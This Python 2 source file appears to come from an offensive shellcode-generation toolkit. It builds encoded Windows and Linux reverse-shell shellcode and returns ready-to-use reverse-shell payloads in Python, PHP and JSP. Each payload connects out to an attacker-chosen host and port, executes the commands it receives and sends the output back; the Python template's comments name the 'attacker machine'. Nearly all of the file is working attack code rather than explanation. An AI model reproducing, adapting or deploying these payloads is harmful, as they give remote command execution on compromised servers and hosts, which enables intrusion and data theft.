#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import time
import sys
from platform import system, architecture


#from pycparser import parse_file, c_parser, c_generator


from Asm import ShellGenerator, Constants
from Encoders import *
from ast import literal_eval

class OSShellcodes:
    """
        Class with shellcodes for operating systems (Linux, Windows, etc)
    """

    # README:
    # Before start execute:
    #   on Linux, on Windows::
    #       pip install pycparser
    #       install nasm, objdump, gcc
    #       add enviroment variable path to nasm, gcc compiler
    #
    # nasm -f elf hello.asm
    # ld -m elf_i386 -o hello hello.o
    # for i in $(objdump -d hello.o | grep "^ " | cut -f2) ; do echo -n '\x'$i ; done ; echo -e '\n'
    # Testing: gcc -fno-stack-protector -z execstack -o test_shell test_shell.c

    def __init__(self, OS_TARGET, OS_TARGET_ARCH, CONNECTBACK_IP='localhost', CONNECTBACK_PORT=5555, BADCHARS=['\x00']):
        self.name = ""
        self.OS_TARGET = OS_TARGET
        self.OS_TARGET_ARCH = OS_TARGET_ARCH
        self.CONNECTBACK_IP = CONNECTBACK_IP
        self.CONNECTBACK_PORT = CONNECTBACK_PORT
        self.BADCHARS = BADCHARS
        self.OS_SYSTEM = system().upper()
        self.OS_ARCH = (architecture())[0]
        return

    def create_shellcode(self, _shellcode_type='', command='calc.exe', message='', encode=None, make_exe=0, debug=0):
        """
            Function for create shellcode
        """
        generator = ShellGenerator(self.OS_TARGET, self.OS_TARGET_ARCH)
        shellcode = generator.get_shellcode(_shellcode_type,
                                            connectback_ip=self.CONNECTBACK_IP,
                                            connectback_port=self.CONNECTBACK_PORT,
                                            command=command,
                                            message=message,
                                            make_exe=make_exe,
                                            debug=debug)
        if encode:
            if debug == 1:
                print "[] Encode shellcode is on and started"
            e = CodeEncoders(self.OS_SYSTEM, self.OS_TARGET, self.OS_TARGET_ARCH, self.BADCHARS)
            e_shellcode = e.encode_shellcode(shellcode, encode, debug)

            if debug == 1:
                print "Length of encoded shellcode: %d" % len(e_shellcode)
                print "[] Encode shellcode finished"
            if e_shellcode:
                shellcode = e_shellcode
        else:
            if debug == 1:
                print "[] Encode shellcode is off"
        return shellcode


class PythonShellcodes:
    """
        Class with shellcodes for python language
    """

    def __init__(self):
        self.name = ""
        return

    def get_python_code(self, badchars, localhost, localport):
        """
            Function to get python shellcode
        """

        if not localhost or not localport:
            print "Settings for connectback listener must be defined"
            return False

        pythoncode = ""
        pythoncode += """
#!/usr/bin/python
import socket,subprocess

HOST = 'LOCALHOST'    # The remote host
PORT = LOCALPORT      # The same port as used by the server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to attacker machine
s.connect((HOST, PORT))

# send we are connected
s.send('[*] Connection Established!')
# start loop
while 1:
    # recieve shell command
    data = s.recv(1024)
    print data

    # if its quit, then break out and close socket
    if data == 'quit' or data == 'q':
        break

    # do shell command
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    # read output
    stdout_value = proc.stdout.read() + proc.stderr.read()
    # send output to attacker
    s.send(stdout_value)
# close socket
s.close()
"""

        pythoncode = pythoncode.replace("LOCALHOST", str(localhost))
        pythoncode = pythoncode.replace("LOCALPORT", str(localport))

        return pythoncode


class PhpShellcodes:
    """
        Class with shellcodes for php language
    """

    def __init__(self):
        self.name = ""
        return

    def get_phpinfo(self, badchars):
        """ Function to get phpinfo """

        phpcode = "<?php phpinfo(); ?>"

        return phpcode

    def get_phpcode(self, localhost, localport):
        """ Function to get php shellcode """

        if not localhost or not localport:
            print "Settings for connectback listener must be defined"
            return False

        phpcode = ""
        phpcode += """
<?php
    $address="LOCALHOST";
    $port="LOCALPORT";
    $buff_size=2048;
    $timeout=120;

    $sock=socket_create(AF_INET,SOCK_STREAM,0) or die("Cannot create a socket");
    socket_set_option($sock,SOL_SOCKET,SO_RCVTIMEO,array('sec'=>$timeout,'usec'=>0));
    socket_set_option($sock,SOL_SOCKET,SO_SNDTIMEO,array('sec'=>$timeout,'usec'=>0));
    socket_connect($sock,$address,$port) or die("Could not connect to the socket");

    while ($read=socket_read($sock,$buff_size)) {
        $out="";
        if ($read) {
            if (strcmp($read,"quit")===0 || strcmp($read,"q")===0) {
                break;
            }

            ob_start();
            passthru($read);
            $out=ob_get_contents();
            ob_end_clean();
        }

        $length=strlen($out);
        while (1) {
            $sent=socket_write($sock,$out,$length);
            if ($sent===false) {
                break;
            }

            if ($sent<$length) {
                $st=substr($st,$sent);
                $length-=$sent;
            } else {
                break;
            }
        }
    }
    socket_close($sock);
?>
"""

        phpcode = phpcode.replace("LOCALHOST", str(localhost))
        phpcode = phpcode.replace("LOCALPORT", str(localport))

        return phpcode

    def get_php_code_inline(self, host, port):
        res = self.get_phpcode(host, port)
        res = res.replace('\n','')
        res = res.replace('\r','')
        return res


class JavaShellcodes:
    """
        Class with shellcodes for java language
    """

    def __init__(self):
        self.name = ""
        return

    def get_javacode(self, localhost, localport):
        """ Function to get java(jsp) shellcode """

        if not localhost or not localport:
            print "Settings for connectback listener must be defined"
            return False

        javacode = ""
        javacode += """
<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>
<%
    for (;;) {
        Socket socket = new Socket("LOCALHOST", LOCALPORT);

        InputStream inSocket = socket.getInputStream();
        BufferedReader s_in = new BufferedReader(new InputStreamReader(inSocket));

        OutputStream outSocket = socket.getOutputStream();

        char buffer[] = new char[8192];
        int length = s_in.read( buffer, 0, buffer.length );
        String cmd = String.valueOf(buffer,0, length);

        Process p = new ProcessBuilder("cmd.exe", "/C", cmd).redirectErrorStream(true).start();
        InputStream is = p.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String in;
        String all = "";
        while ((in = br.readLine()) != null) {
            all = all + in + "\\n\\r";
        }
        outSocket.write(all.getBytes());
        socket.close();
    }
%>"""

        javacode = javacode.replace("LOCALHOST", str(localhost))
        javacode = javacode.replace("LOCALPORT", str(localport))

        return javacode

if __name__ == "__main__":

    # # Example for generate shellcode at php-language #1
    # print "Generate shellcode started"
    # s = PhpShellcodes()
    # badchars = ""   # NOTE: now not used
    # code = s.get_phpinfo(badchars)
    # print base64.b64encode(code)
    # print "Generate shellcode finished"

    # # Example for generate shellcode at php-language #2
    # print "Generate shellcode started"
    # s = PhpShellcodes()
    # badchars = ""   # NOTE: now not used
    # code = s.get_php_code(badchars, "172.16.195.1", 5555)
    # print urllib.quote_plus(base64.b64encode(code))
    # print "Generate shellcode finished"

    # # Example for generate shellcode at java-language
    # print "Generate shellcode started"
    # s = JavaShellcodes()
    # badchars = ""   # NOTE: now not used
    # code = s.get_javacode(badchars, "172.16.195.1", 5555)
    # print code
    # print "Generate shellcode finished"

    # Example for generate shellcode for Linux/Windows
    print "[] Generate shellcode started"

    BADCHARS = ["\x00", "\x0a", "\x0d", "\x3b"]

    os_target = Constants.OS.WINDOWS
    os_target_arch = Constants.OS_ARCH.X32
    #s = OSShellcodes('172.16.195.128', 5555, BADCHARS)
    s = OSShellcodes(os_target, os_target_arch, '127.0.0.1', 4000, BADCHARS)

    shellcode_type = 'reverse'
    shellcode = s.create_shellcode(
        shellcode_type,
        encode=Constants.EncoderType.XOR,
        make_exe=1,
        debug=1
    )
    print "[] Generate shellcode finished"